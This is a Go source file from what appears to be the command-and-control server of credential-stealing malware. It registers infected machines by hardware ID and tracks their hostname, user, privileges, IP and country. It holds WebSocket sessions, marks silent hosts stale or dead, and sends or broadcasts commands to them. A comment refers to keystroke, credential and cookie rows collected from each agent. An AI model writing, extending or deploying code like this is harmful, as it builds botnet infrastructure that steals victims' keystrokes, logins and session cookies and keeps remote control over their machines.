package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/jmoiron/sqlx"
)

type Agent struct {
	ID            string         `db:"id" json:"id"`
	SessionID     uint32         `db:"session_id" json:"session_id"`
	Hostname      string         `db:"hostname" json:"hostname"`
	Username      string         `db:"username" json:"username"`
	OSVersion     string         `db:"os_version" json:"os_version"`
	Arch          string         `db:"arch" json:"arch"`
	PID           int            `db:"pid" json:"pid"`
	Privileges    int            `db:"privileges" json:"privileges"`
	HwID          string         `db:"hw_id" json:"hw_id"`
	BuildVersion  int            `db:"build_version" json:"build_version"`
	FirstSeen     time.Time      `db:"first_seen" json:"first_seen"`
	LastSeen      time.Time      `db:"last_seen" json:"last_seen"`
	IPAddress     string         `db:"ip_address" json:"ip_address"`
	Country       string         `db:"country" json:"country"`
	Tags          string         `db:"tags" json:"tags"`
	Notes         string         `db:"notes" json:"notes"`
	Status        string         `db:"status" json:"status"`
	Metadata      string         `db:"metadata" json:"metadata"`
	WSConn        *WSConnection  `db:"-" json:"-"`
	Capabilities  []string       `db:"-" json:"capabilities"`
	mu            sync.RWMutex
}

type WSConnection struct {
	Conn       *websocket.Conn
	SendChan   chan []byte
	LastPing   time.Time
	mu         sync.Mutex
}

type Manager struct {
	db       *sqlx.DB
	agents   map[string]*Agent
	sessionID uint32
	mu       sync.RWMutex
}

func NewManager(db *sqlx.DB) *Manager {
	m := &Manager{
		db:      db,
		agents:  make(map[string]*Agent),
		sessionID: 1000,
	}
	m.loadFromDB()
	return m
}

func (m *Manager) loadFromDB() {
	var agents []Agent
	err := m.db.Select(&agents, "SELECT * FROM agents WHERE status != 'dead'")
	if err != nil {
		log.Printf("[agent] Load from DB error: %v", err)
		return
	}
	for i := range agents {
		a := &agents[i]
		m.agents[a.ID] = a
		if a.SessionID >= m.sessionID {
			m.sessionID = a.SessionID + 1
		}
	}
	log.Printf("[agent] Loaded %d agents from DB", len(m.agents))
}

func (m *Manager) Register(reg *RegistrationData, wsConn *websocket.Conn, ip string) (*Agent, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Check if agent already exists by HWID
	var existing *Agent
	for _, a := range m.agents {
		if a.HwID == reg.HwID && a.Status != "dead" {
			existing = a
			break
		}
	}

	var agent *Agent
	if existing != nil {
		// Reconnecting agent
		agent = existing
		agent.SessionID = m.nextSessionID()
		agent.LastSeen = time.Now()
		agent.IPAddress = ip
		agent.Status = "active"
		agent.PID = reg.PID
		agent.Privileges = reg.Privileges
		agent.BuildVersion = reg.BuildVersion
		agent.OSVersion = reg.OSVersion
		agent.Username = reg.Username
		agent.Hostname = reg.Hostname
		agent.Capabilities = reg.Capabilities
		m.persistAgent(agent)
	} else {
		// New agent
		agent = &Agent{
			ID:           uuid.New().String(),
			SessionID:    m.nextSessionID(),
			Hostname:     reg.Hostname,
			Username:     reg.Username,
			OSVersion:    reg.OSVersion,
			Arch:         reg.Arch,
			PID:          reg.PID,
			Privileges:   reg.Privileges,
			HwID:         reg.HwID,
			BuildVersion: reg.BuildVersion,
			FirstSeen:    time.Now(),
			LastSeen:     time.Now(),
			IPAddress:    ip,
			Status:       "active",
			Capabilities: reg.Capabilities,
		}
		m.agents[agent.ID] = agent

		m.persistAgent(agent)
	}

	// Setup WS connection
	if wsConn != nil {
		agent.WSConn = &WSConnection{
			Conn:     wsConn,
			SendChan: make(chan []byte, 100),
			LastPing: time.Now(),
		}

		go m.handleAgentWS(agent)
	}

	log.Printf("[agent] Registered: %s (%s\\%s) session=%d", agent.ID, agent.Hostname, agent.Username, agent.SessionID)
	return agent, nil
}

func (m *Manager) nextSessionID() uint32 {
	id := m.sessionID
	m.sessionID++
	return id
}

func (m *Manager) persistAgent(a *Agent) {
	tags, _ := json.Marshal(a.Tags)
	metadata, _ := json.Marshal(a.Metadata)

	// NOTE: must be a true upsert. INSERT OR REPLACE deletes the old row,
	// which CASCADE-deletes every keystroke/credential/cookie row that
	// references this agent (foreign_keys is ON). UpdateLastSeen runs this
	// on every beacon, so the REPLACE version silently wiped all collected
	// data on each heartbeat.
	_, err := m.db.Exec(`
		INSERT INTO agents 
		(id, session_id, hostname, username, os_version, arch, pid, privileges, hw_id, build_version, first_seen, last_seen, ip_address, country, tags, notes, status, metadata)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(id) DO UPDATE SET
			session_id=excluded.session_id,
			hostname=excluded.hostname,
			username=excluded.username,
			os_version=excluded.os_version,
			arch=excluded.arch,
			pid=excluded.pid,
			privileges=excluded.privileges,
			hw_id=excluded.hw_id,
			build_version=excluded.build_version,
			last_seen=excluded.last_seen,
			ip_address=excluded.ip_address,
			country=excluded.country,
			tags=excluded.tags,
			notes=excluded.notes,
			status=excluded.status,
			metadata=excluded.metadata
	`, a.ID, a.SessionID, a.Hostname, a.Username, a.OSVersion, a.Arch, a.PID, a.Privileges, a.HwID, a.BuildVersion,
		a.FirstSeen, a.LastSeen, a.IPAddress, a.Country, string(tags), a.Notes, a.Status, string(metadata))

	if err != nil {
		log.Printf("[agent] Persist error: %v", err)
	}
}

func (m *Manager) handleAgentWS(a *Agent) {
	defer func() {
		a.WSConn = nil
		a.Status = "stale"
		m.persistAgent(a)
	}()

	conn := a.WSConn.Conn
	conn.SetReadLimit(10 * 1024 * 1024)
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	conn.SetPongHandler(func(string) error {
		a.WSConn.mu.Lock()
		a.WSConn.LastPing = time.Now()
		a.WSConn.mu.Unlock()
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			if !websocket.IsCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("[agent] WS read error for %s: %v", a.ID, err)
			}
			break
		}

		// Handle incoming message from agent
		m.handleAgentMessage(a, msg)
	}
}

func (m *Manager) handleAgentMessage(a *Agent, msg []byte) {
	// Parse header
	if len(msg) < 24 {
		return
	}

	// Handle different message types
	// This would integrate with the protocol from the client
	log.Printf("[agent] Received %d bytes from %s", len(msg), a.ID)
}

func (m *Manager) Get(id string) (*Agent, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	a, ok := m.agents[id]
	return a, ok
}

// GetByHwID resolves an agent from the hardware id reported in HTTP beacons.
func (m *Manager) GetByHwID(hw string) (*Agent, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	for _, a := range m.agents {
		if a.HwID == hw && a.Status != "dead" {
			return a, true
		}
	}
	return nil, false
}

func (m *Manager) GetBySessionID(sessionID uint32) (*Agent, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	for _, a := range m.agents {
		if a.SessionID == sessionID {
			return a, true
		}
	}
	return nil, false
}

func (m *Manager) List() []*Agent {
	m.mu.RLock()
	defer m.mu.RUnlock()
	list := make([]*Agent, 0, len(m.agents))
	for _, a := range m.agents {
		list = append(list, a)
	}
	return list
}

func (m *Manager) ListActive() []*Agent {
	m.mu.RLock()
	defer m.mu.RUnlock()
	list := make([]*Agent, 0)
	for _, a := range m.agents {
		if a.Status == "active" {
			list = append(list, a)
		}
	}
	return list
}

func (m *Manager) UpdateLastSeen(id string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if a, ok := m.agents[id]; ok {
		a.LastSeen = time.Now()
		go m.persistAgent(a)
	}
}

func (m *Manager) UpdateStatus(id, status string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if a, ok := m.agents[id]; ok {
		a.Status = status
		go m.persistAgent(a)
	}
}

func (m *Manager) UpdateNotes(id, notes string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if a, ok := m.agents[id]; ok {
		a.Notes = notes
		go m.persistAgent(a)
	}
}

func (m *Manager) UpdateTags(id string, tags []string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if a, ok := m.agents[id]; ok {
		tagsJSON, _ := json.Marshal(tags)
		a.Tags = string(tagsJSON)
		go m.persistAgent(a)
	}
}

func (m *Manager) Remove(id string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if a, ok := m.agents[id]; ok {
		a.Status = "dead"
		go m.persistAgent(a)
		delete(m.agents, id)
	}
}

func (m *Manager) Send(id string, data []byte) error {
	m.mu.RLock()
	a, ok := m.agents[id]
	m.mu.RUnlock()

	if !ok || a.WSConn == nil {
		return fmt.Errorf("agent not connected")
	}

	select {
	case a.WSConn.SendChan <- data:
		return nil
	default:
		return fmt.Errorf("send buffer full")
	}
}

func (m *Manager) Broadcast(data []byte, filter func(*Agent) bool) {
	m.mu.RLock()
	agents := make([]*Agent, 0, len(m.agents))
	for _, a := range m.agents {
		if filter == nil || filter(a) {
			agents = append(agents, a)
		}
	}
	m.mu.RUnlock()

	for _, a := range agents {
		m.Send(a.ID, data)
	}
}

func (m *Manager) CleanupStale(ctx context.Context, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			m.mu.Lock()
			now := time.Now()
			for id, a := range m.agents {
				if a.Status == "active" && now.Sub(a.LastSeen) > 2*interval {
					log.Printf("[agent] Marking %s as stale (last seen %v ago)", id, now.Sub(a.LastSeen))
					a.Status = "stale"
					go m.persistAgent(a)
				}
				if a.Status == "stale" && now.Sub(a.LastSeen) > 30*time.Minute {
					log.Printf("[agent] Marking %s as dead", id)
					a.Status = "dead"
					go m.persistAgent(a)
				}
			}
			m.mu.Unlock()
		}
	}
}

func (m *Manager) Count() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.agents)
}

func (m *Manager) CountActive() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	count := 0
	for _, a := range m.agents {
		if a.Status == "active" {
			count++
		}
	}
	return count
}

type RegistrationData struct {
	Type         string   `json:"type"`
	Hostname     string   `json:"hostname"`
	Username     string   `json:"username"`
	OSVersion    string   `json:"os_version"`
	Arch         string   `json:"arch"`
	PID          int      `json:"pid"`
	Privileges   int      `json:"privileges"`
	HwID         string   `json:"hw_id"`
	BuildVersion int      `json:"build_version"`
	Capabilities []string `json:"capabilities"`
}